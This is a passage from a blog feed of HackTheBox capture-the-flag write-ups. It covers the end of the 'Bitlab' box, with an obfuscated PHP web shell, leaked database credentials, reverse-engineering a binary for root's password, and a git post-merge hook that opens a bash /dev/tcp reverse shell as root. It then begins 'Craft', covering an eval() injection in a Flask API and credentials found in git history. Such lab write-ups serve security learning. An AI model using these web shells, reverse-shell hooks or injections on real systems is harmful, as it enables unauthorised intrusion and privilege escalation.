class="variable">$A</span>=<span class="string">'+-j&#125;;&#125;&#125;r+-e+-tur+-n $o;&#125;if(+-@preg_+-+-matc+-h("/$kh(+-.+)+-$kf/",@file_get_+-conten'</span>;</span><br><span class="line"><span class="variable">$Y</span>=<span class="string">';$r+-=@ba+-se64_+-+-encod+-e(@x(@gzcompre+-ss(+-$o),$+-k));print("$p+-+-$kh$r$kf");&#125;'</span>;</span><br><span class="line"><span class="variable">$G</span>=<span class="string">'or($i=0;$i+-&lt;$l+-;+-)&#123;fo+-r($+-j+-=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++-+-+,$+-i++)&#123;$o.=$t&#123;$i&#125;^$k&#123;$'</span>;</span><br><span class="line"><span class="variable">$D</span>=<span class="string">'ba+-s+-e+-64_decode($m[1+-])+-,$k+-)));$o=@ob_get_c+-+-onte+-nts();@ob_en+-d_clean()'</span>;</span><br><span class="line"><span class="variable">$l</span>=<span class="string">'ONjCY+-uBR";funct+-ion x+-($t,$k+-)&#123;$c+-=+-strle+-+-n($k);$l=st+-rlen(+-$t);$o="+-";f'</span>;</span><br><span class="line"><span class="variable">$n</span>=str_replace(<span class="string">'A'</span>,<span class="string">''</span>,<span class="string">'AcAreAate_AfuncAtiAon'</span>);</span><br><span class="line"><span class="variable">$w</span>=<span class="string">'ts(+-"php:/+-/+-input"),$+-m)==1)&#123;+-@ob_s+-tart()+-;+-@eva+-l(@gzu+-ncompress(@x+-(@'</span>;</span><br><span class="line"><span class="variable">$W</span>=str_replace(<span class="string">'+-'</span>,<span class="string">''</span>,<span class="variable">$r</span>.<span class="variable">$l</span>.<span class="variable">$G</span>.<span class="variable">$A</span>.<span class="variable">$w</span>.<span class="variable">$D</span>.<span class="variable">$Y</span>);</span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$n</span>(<span class="string">''</span>,<span class="variable">$W</span>);<span class="variable">$u</span>();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>After committing our new file to the repository we start a merge request and merge it ourselves since we have enough permissions to do so. </p><p>Our web-shell is now in the <code>profile</code> repository:</p><p><img src="https://user-images.githubusercontent.com/9076747/67625567-7913c180-f82f-11e9-9a78-54c020336a58.png" alt="profile repository webshell"></p><p>If the web-hook worked properly our web shell file should already be on the server, let’s try it out :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python weevely.py http://bitlab.htb/profile/hg8.php htbpassword</span><br><span class="line"></span><br><span class="line">weevely&gt; id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@bitlab:/var/www/html/profile $</span><br></pre></td></tr></table></figure><p>We are in as user <code>www-data</code>. </p><h3 id="Pivot-www-data-gt-clave-user"><a href="#Pivot-www-data-gt-clave-user" class="headerlink" title="Pivot www-data -&gt; clave user"></a>Pivot www-data -&gt; clave user</h3><p>Let’s do some recon to get the user flag :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/ $ ls /home</span><br><span class="line">clave</span><br><span class="line">www-data@bitlab:/ $ ls -l /home/clave</span><br><span class="line">-r-------- 1 clave clave 13824 Jul 30 19:58 RemoteConnection.exe</span><br><span class="line">-r-------- 1 clave clave    33 Feb 28  2019 user.txt</span><br></pre></td></tr></table></figure><p>The user is <code>clave</code> as well. </p><p>After a bit of recon, it seems that nothing helpful seems to be accessible from <code>www-data</code> user. When nothing can be found, a good strategy is to go back at the beginning to make sure we didn’t forgot anything. Let’s go back to our starting point : Gitlab.</p><p>After searching around and digging a bit more we can find a “Snippet” page under each users profile. On the Developer profile there is a <code>Postgresql</code> snippet with hard-coded credentials:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$db_connection = pg_connect(<span class="string">"host=localhost dbname=profiles user=profiles password=profiles"</span>);</span><br><span class="line">$result = pg_query($db_connection, <span class="string">"SELECT * FROM profiles"</span>);</span><br></pre></td></tr></table></figure><p>Let’s try to dig into the database for useful informations:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/ $ psql profiles profiles</span><br><span class="line">sh: 1: psql: not found</span><br></pre></td></tr></table></figure><p>Since <code>psql</code> is not installed, let’s use the postgresql PHP library. I tweaked the snippet a little to obtain the following scrip :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$db_connection = pg_connect(<span class="string">"host=localhost dbname=profiles user=profiles password=profiles"</span>);</span><br><span class="line"></span><br><span class="line">$query_result = pg_query($db_connection, <span class="string">"SELECT * FROM profiles"</span>);</span><br><span class="line">$results = pg_fetch_all($query_result);</span><br><span class="line">print_r($results);</span><br></pre></td></tr></table></figure><p>Running the php script output only one user, <code>clave</code> again and what looks like a <code>base64</code> encoded password:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/tmp $ php test.php</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [id] =&gt; 1</span><br><span class="line">            [username] =&gt; clave</span><br><span class="line">            [password] =&gt; c3NoLXN0cjBuZy1wQHNz==</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>Decoding the password gives the following:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"c3NoLXN0cjBuZy1wQHNz=="</span> | base64 -di</span><br><span class="line">ssh-str0ng-p@ss</span><br></pre></td></tr></table></figure><p>Awesome, we got the ssh password for user <code>clave</code> let’s go for the user flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh clave@bitlab.htb</span><br><span class="line">clave@bitlab.htb<span class="string">'s password:</span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br></pre></td></tr></table></figure><p><code>Permission denied</code> that’s disappointing and strange. The database entry clearly state the user is <code>clave</code> (we saw previously that no other user are present on the box). The password itself state ssh… Could it be that it was simply the clear-text password…?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh clave@bitlab.htb</span><br><span class="line">clave@bitlab.htb<span class="string">'s password:</span></span><br><span class="line"><span class="string">Last login: Sun Oct 27 14:26:51 2019 from 10.10.10.10</span></span><br><span class="line"><span class="string">clave@bitlab:~$ cat user.txt</span></span><br><span class="line"><span class="string">1e3fxxxxxxxxxxxxxxxxb8154</span></span><br></pre></td></tr></table></figure><p>That was it, it was easy to loose time on this one but the password was <code>c3NoLXN0cjBuZy1wQHNz==</code> without decoding.</p><p>Time to move to root.</p><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>The recon part was quite quick, a Windows executable named <code>RemoteConnection.exe</code> was present on the home folder. </p><p>Got a little surprised seeing this in a Linux box but why not after all. It was my first time reverse engineering so it took me a bit of time to gather the right tools and understand how this binary was working.</p><p>Let’s pull it and start the analysis:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ scp clave@bitlab.htb:~/RemoteConnection.exe .</span><br><span class="line">clave@bitlab.htb<span class="string">'s password:</span></span><br><span class="line"><span class="string">RemoteConnection.exe               100%   14KB 279.5KB/s   00:00</span></span><br></pre></td></tr></table></figure><h3 id="Reverse-engineering-of-RemoteConnection-exe"><a href="#Reverse-engineering-of-RemoteConnection-exe" class="headerlink" title="Reverse engineering of RemoteConnection.exe"></a>Reverse engineering of RemoteConnection.exe</h3><p>Oddly enough I was able to make it work on <em>any</em> of my virtual machines. Tried Windows 7, 10, x32, x64 everything. </p><p>Every time I got the following error message:</p><blockquote><p>EXCEPTION_ACCESS_VIOLATION</p><p>Ntdll - Inaccesible Address</p></blockquote><p>So if anyone have any idea where this come from and how to fix please leave a comment.</p><p>Anyway, I managed to borrow a Windows computer just to finish this box.</p><p>The executable is 32-bit, running it display the following:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\hg8\&gt; .\RemoteConnection.exe</span><br><span class="line">Access Denied !!</span><br></pre></td></tr></table></figure><h4 id="Strings"><a href="#Strings" class="headerlink" title="Strings"></a>Strings</h4><p>Running <code>strings</code> on the file doesn’t output a lot of valuable informations: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ strings RemoteConnection.exe</span><br><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</span><br><span class="line">XRIBG0UCDh0HJRcIBh8EEk8aBwdQTAIERVIwFEQ4SDghJUsHJTw1TytWFkwPVgQ2RztS</span><br><span class="line">parse</span><br><span class="line">Access Denied !!</span><br><span class="line">string too long</span><br><span class="line">invalid string position</span><br><span class="line">GetUserNameW</span><br><span class="line">ShellExecuteW</span><br><span class="line">SHELL32.dll</span><br></pre></td></tr></table></figure><p>We can see <code>GetUserNameW</code> what <em>might</em> be used to retrieve the current Windows session username and <code>ShellExecuteW</code> which is a function to run external command.</p><p>To get more information out of it I will use a debugger. This way maybe we can pull more valuable informations during runtime by reading the memory or even patching the binary to bypass the check leading to <code>Access Denied</code>.</p><h4 id="Debugging"><a href="#Debugging" class="headerlink" title="Debugging"></a>Debugging</h4><p>I will use <a href="https://x64dbg.com" target="_blank" rel="noopener"><code>x32dbg</code></a> since it’s free and open-source. </p><p>After opening our binary we forward run once to arrive to the <code>RemoteConnection.exe</code> entry point:</p><p><img src="https://user-images.githubusercontent.com/9076747/80528522-5907bb00-8996-11ea-9857-427940c42f1a.png" alt="remoteconnection.exe entry point"></p><p>Now let’s extract the referenced strings using the function provided by x32dbg:</p><p><img src="https://user-images.githubusercontent.com/9076747/80528813-d0d5e580-8996-11ea-80e5-8f100149aaec.png" alt="remoteconnexion.exe bitlab strings"></p><p>This is starting to get a bit more interesting. We have a reference to our previous user <code>clave</code> and a reference to <code>putty.exe</code>. Putty is a Windows terminal emulator often used to connect to server through SSH.</p><p>If I could guess so far, the program check using <code>GetUserNameW</code> if the current user is <code>clave</code> and if so it will launch <code>putty.exe</code> using <code>ShellExecuteW</code> to automatically connect to, probably, the root account on Bitlab server. Unfortunately there is still no passwords in those referenced strings.</p><p>Let’s continue digging to see if we can either:</p><ul><li>Reverse the algorithm used to obfuscate the password.</li><li>Patch the binary to launch putty even if the connected user is not <code>clave</code>.</li><li>Read some other interesting strings from memory.</li></ul><p>To start off let’s double-click the <code>L&quot;clave&quot;</code> to see where it’s reference:</p><p><img src="https://user-images.githubusercontent.com/9076747/80529378-ae909780-8997-11ea-9b67-1d56644cfa18.png" alt="clave cmp bitlab"></p><p>Ok so looks like we are on the right track, we have a compare to the <code>clave</code> strings if the comparaison fail we jump to what is probably the <code>Access Denied !!</code> error message, while if the comparaison return true the function continue to the call of <code>putty.exe</code>.</p><h4 id="Breaking"><a href="#Breaking" class="headerlink" title="Breaking"></a>Breaking</h4><p>Let’s put a breakpoint on the <code>clave</code> <code>cmp</code> line to see what’s going on it memory. To do so click the grey circle on the left of the line to turn it red. Then let’s forward once:</p><p><img src="https://user-images.githubusercontent.com/9076747/80529782-42fafa00-8998-11ea-8bcc-5e13388f7ae5.png" alt="bitlab remoteconnexion.exe strings password"></p><p>Bingo! Even at the moment of comparing the user the <code>eax</code> already contains the full command passed to Putty.</p><p><img src="https://user-images.githubusercontent.com/9076747/80529850-69b93080-8998-11ea-888c-cdb5253103bd.png" alt="bitlab root credentials remoteconnexion.exe"></p><p>Let’s use the those credentials to login to the root account using SSH:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ssh root@bitlab.htb</span><br><span class="line">root@bitlab.htb<span class="string">'s password:</span></span><br><span class="line"><span class="string">Last login: Fri Sep 13 14:11:14 2019</span></span><br><span class="line"><span class="string">root@bitlab:~# id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string">root@bitlab:~# cat root.txt</span></span><br><span class="line"><span class="string">8xxxxxxxxxxxxxxxxxxxxxxxxc</span></span><br></pre></td></tr></table></figure><h2 id="“Unintended”-way-to-root"><a href="#“Unintended”-way-to-root" class="headerlink" title="“Unintended” way to root"></a>“Unintended” way to root</h2><p>While having a shell as <code>www-data</code> we notice an unusual <code>sudo</code> configuration:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www-data on bitlab:</span><br><span class="line">    env_reset, exempt_group=sudo, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on bitlab:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/git pull</span><br></pre></td></tr></table></figure><p>This is used to automatically deploy projects to the server. The sudo is probably used to pull file where even if the permissions does not match.</p><p>The Git documentation point an interesting fact about <code>git pull</code>:</p><blockquote><p>In its default mode, <code>git pull</code> is shorthand for <code>git fetch</code> followed by <code>git merge FETCH_HEAD</code>.</p><p><a href="https://git-scm.com/docs/git-pull" target="_blank" rel="noopener">https://git-scm.com/docs/git-pull</a></p></blockquote><p>That mean we have a <code>git merge</code> run as root. We can probably leverage this with a hook to achieve remote code execution as <code>root</code>. As a reminder:</p><blockquote><p>Hooks are programs you can place in a hooks directory to trigger actions at certain points in git’s execution. </p><p><a href="https://git-scm.com/docs/githooks" target="_blank" rel="noopener">https://git-scm.com/docs/githooks</a></p></blockquote><p>We are going to use a <a href="https://git-scm.com/docs/githooks#_post_merge" target="_blank" rel="noopener"><code>post-merge</code></a> hook since it’s going to be executed whenever a <code>git pull</code> is executed.</p><p>Unfortunately neither <code>profile</code> nor <code>deployer</code> project can be directly written as <code>www-data</code>. That’s not really a problem since we can simply copy the project to the <code>/tmp/</code> folder for example and be able to work on it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/$ cp -r /var/www/html/profile /tmp/.hg8</span><br><span class="line">www-data@bitlab:/$ <span class="built_in">cd</span> /tmp/.hg8/profile/.git/hooks</span><br><span class="line">www-data@bitlab:/$ touch post-merge</span><br><span class="line">www-data@bitlab:/$ chmod +x post-merge</span><br></pre></td></tr></table></figure><p>Let’s try to open a reverse shell as <code>root</code> using that hook. First let’s create our reverse shell file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/$ cat post-merge</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.10.10/8585 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>Then we open our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>Next step is to make a <code>sudo /usr/bin/git pull</code> to have our hook and reverse shell executed:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/tmp/.hg8/profile$ sudo /usr/bin/git pull</span><br><span class="line">Already up to date.</span><br></pre></td></tr></table></figure><p>Ah yes, there is no change to the project, let’s quickly go back to the Gitlab interface and commit a dummy file to <code>profile</code> project, then let’s <code>git pull</code> again:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/tmp/.hg8/profile$ sudo /usr/bin/git pull   </span><br><span class="line">remote: Enumerating objects: 1, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (1/1), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (1/1), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 1 (delta 1), reused 1 (delta 1)</span><br><span class="line">Unpacking objects: 100% (1/1), <span class="keyword">done</span>.</span><br><span class="line">From ssh://localhost:3022/root/profile</span><br><span class="line">   34c4513..86773b8  master     -&gt; origin/master</span><br><span class="line">Updating 34c4513..86773b8</span><br><span class="line">Fast-forward</span><br><span class="line"> hg8 | 1 +</span><br><span class="line"> 1 file changed, 1 addition(+)</span><br></pre></td></tr></table></figure><p>And we get a new connection on our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.114:40048</span><br><span class="line">$ id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">$ cat root.txt</span><br><span class="line">8xxxxxxxxxxxxxxxxxxxxxxxxc</span><br></pre></td></tr></table></figure><hr><p>As always do not hesitate to contact me for any questions or feedback.</p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Medium Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> webshell </tag>
            
            <tag> bitlab </tag>
            
            <tag> obfuscation </tag>
            
            <tag> git </tag>
            
            <tag> gitlab </tag>
            
            <tag> git hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Craft</title>
      <link href="/posts/craft/"/>
      <url>/posts/craft/</url>
      
        <content type="html"><![CDATA[<img width="582" alt="craft-hackthebox" src="https://user-images.githubusercontent.com/9076747/82154040-9cee3180-986b-11ea-9048-4be3630fbacc.png"><p>Craft was very interesting and well designed box. It was a not so straight forward to solve and mainly based on configuration mistakes rather than exploits. That makes it more interesting in my opinion since we get closer to real life scenarios. I also learned a few tricks on this one.</p><p><strong>Tl;Dr:</strong> The user flag was accessible after finding the main API credentials in the Git history of the project. With access to the code source and the API itself, we find a vulnerability allowing Remote Code Execution. This RCE leads to a shell inside of a Docker. From this shell we access the API config files containing database connection settings allowing us to extract users credentials stored there. The credentials let us access to <code>gilfoyle</code> repositories where one contains his SSH key backup. Using this SSH key we connect to his account and grab the user flag.<br>The root flag was accessible after using Vault instance configured on the box to generate a One Time Password for the SSH <code>root</code> account. We connect through SSH using this password and get the flag.</p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the host file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.110 craft.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC craft.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-20 01:26 CEST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> craft.htb (10.10.10.110)</span><br><span class="line">Host is up (0.048s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)</span><br><span class="line">443/tcp open  ssl/http nginx 1.15.8</span><br><span class="line">|_http-server-header: nginx/1.15.8</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 17.15 seconds</span><br></pre></td></tr></table></figure><p>We have a classical web app running on port 443 and the ssh port 22 open.</p><p>Opening <code>http://craft.htb</code> display the following website :</p><p><img src="https://user-images.githubusercontent.com/9076747/67158804-0db48600-f33d-11e9-98f1-b10407a44179.png" alt="Craft Website"></p><p>The website is super simple but give us two valuable information:</p><ul><li>A <code>gogs</code> instance is running (<code>gogs</code> is a self-hosted Git service written in Go) at <code>https://gogs.craft.htb/</code></li><li>An API is running and its documentation available at <code>https://api.craft.htb/api/</code></li></ul><p>We need to add those two in our <code>/etc/hosts/</code> file to be able to access it :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.110 gogs.craft.htb"</span> &gt;&gt; /etc/hosts</span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.110 api.craft.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>Following this, <code>https://gogs.craft.htb</code> displays:</p><p><img src="https://user-images.githubusercontent.com/9076747/67158918-b8797400-f33e-11e9-9223-2ac64d958595.png" alt="Gogs instance Craft website"></p><p>and <code>https://api.craft.htb</code> displays:</p><p><img src="https://user-images.githubusercontent.com/9076747/67158927-c8915380-f33e-11e9-8c59-cc2973c76cfd.png" alt="Craft API website"></p><p>We have the source code and the documentation of the API. That will surely be our entry point.</p><p>Out of curiosity I checked for exploit on <code>Gogs</code> and found CVE-2018-18925 and CVE-2018-20303:</p><blockquote><p>Gogs 0.11.66 allows remote code execution because it does not properly validate session IDs, as demonstrated by a “..” session-file forgery in the file session provider in file.go.<br><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-18925" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2018-18925</a></p></blockquote><blockquote><p>In pkg/tool/path.go in Gogs before 0.11.82.1218, a directory traversal in the file-upload functionality can allow an attacker to create a file under data/sessions on the server.<br><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-20303" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2018-20303</a></p></blockquote><p>An exploit is also available (<a href="https://github.com/TheZ3ro/gogsownz" target="_blank" rel="noopener">GogsOwnz</a>) and allows to gain administrator rights and RCE on a Gogs/Gitea server.</p><p>Unfortunately the footer of <code>https://gogs.craft.htb</code> shows that the version used is not a vulnerable one :</p><blockquote><p>© 2018 Gogs Version: 0.11.86.0130</p></blockquote><p>This confirms that our entry point will probably be the api. Let’s investigate.</p><p>We have access to the source code it will greatly help our investigation. The API is written in Python using the Flask framework.</p><p>Let’s clone it to check the code more easily :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ GIT_SSL_NO_VERIFY=<span class="literal">true</span> git <span class="built_in">clone</span> https://gogs.craft.htb/Craft/craft-api.git</span><br></pre></td></tr></table></figure><h3 id="Remote-code-execution-on-API"><a href="#Remote-code-execution-on-API" class="headerlink" title="Remote code execution on API"></a>Remote code execution on API</h3><p>The first thing I do when doing static code analysis is checking if dangerous functions are used and can be exploited for command injection. It’s the easiest way to land a shell on a box.<br>If this search don’t give any results I will move on to SQL injection and so on.</p><p>The most common way command injection vulnerability get introduced in Python is by the use of <code>eval()</code> function which is used to run the Python code (passed as argument) within the program.</p><p>A quick <code>grep</code> will tell us if such function is used within the API:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ grep -ri <span class="string">"eval"</span> craft-api</span><br><span class="line">craft-api/craft_api/api/brew/endpoints/brew.py:        <span class="keyword">if</span> <span class="built_in">eval</span>(<span class="string">'%s &gt; 1'</span> % request.json[<span class="string">'abv'</span>]):</span><br></pre></td></tr></table></figure><p>We are lucky, and just by the look of the line it seems like no sanitization is done and the <code>abv</code> request parameter is directly run through <code>eval()</code>.</p><p>Reading through the code of <code>brew.py</code> confirm the suspicion:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@auth.auth_required</span></span><br><span class="line"><span class="meta">@api.expect(beer_entry)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Creates a new brew entry.</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make sure the ABV value is sane.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> eval(<span class="string">'%s &gt; 1'</span> % request.json[<span class="string">'abv'</span>]):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"ABV must be a decimal value less than 1.0"</span>, <span class="number">400</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    create_brew(request.json)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="number">201</span></span><br></pre></td></tr></table></figure><p>Any Python code sent in the request <code>abv</code> parameter will get interpreted. </p><p>Unfortunately <code>@auth.auth_required</code> inform us that we will first need a way to authenticate ourselves before being able to use this vulnerable endpoint.</p><p>After reading the documentation and the source code, it doesn’t seem there is any way to create a new account or use an already made token to authenticate to the API. We need to find another way to authenticate.</p><p>Since we have access to the git repository, we can try to exploit common flaw found in git/svn repositories. The most common issue is developers accidentally push API keys, token or password to the repository.</p><p>There is a few good tools like <a href="https://github.com/dxa4481/truffleHog" target="_blank" rel="noopener">truffleHog</a> or <a href="https://github.com/awslabs/git-secrets" target="_blank" rel="noopener">git-secrets</a> that allows to automatically retrieve secrets and credentials accidentally committed.</p><p>Since there is only 6 commits in history we can manually review them to make sure we don’t forget anything. </p><p>At commit <code>a2d28ed155</code> we find an interesting cleanup:</p><p><img src="https://user-images.githubusercontent.com/9076747/67160472-668e1980-f351-11e9-8cb2-f2f49bae0833.png" alt="Commit cleanup"></p><p>Let’s try to use those credentials to authenticate to the API:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">"https://api.craft.htb/api/auth/login"</span> -k --user dinesh:4aUh0A8PbVJxgd</span><br><span class="line">&#123;<span class="string">"token"</span>:<span 